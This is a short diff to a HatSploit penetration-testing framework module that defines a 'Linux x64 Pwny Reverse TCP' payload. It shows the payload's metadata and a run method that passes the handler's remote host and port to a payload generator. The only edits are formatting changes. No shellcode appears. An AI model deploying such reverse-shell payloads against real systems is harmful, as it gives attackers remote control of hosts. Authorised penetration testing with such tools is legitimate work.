@@ -15,15 +15,13 @@ class HatSploitPayload(Payload, Pwny):
     details = {
         'Name': "Linux x64 Pwny Reverse TCP",
         'Payload': "linux/x64/pwny_reverse_tcp",
-        'Authors': [
-            'Ivan Nikolsky (enty8080) - payload developer'
-        ],
+        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
         'Description': "Pwny reverse TCP payload for Linux x64.",
         'Architecture': "x64",
         'Platform': "linux",
         'Session': PwnySession,
         'Rank': "high",
-        'Type': "reverse_tcp"
+        'Type': "reverse_tcp",
     }
 
     def run(self):
@@ -31,5 +29,5 @@ class HatSploitPayload(Payload, Pwny):
             self.details['Platform'],
             self.details['Architecture'],
             self.handler['RHOST'],
-            self.handler['RPORT']
+            self.handler['RPORT'],
         )
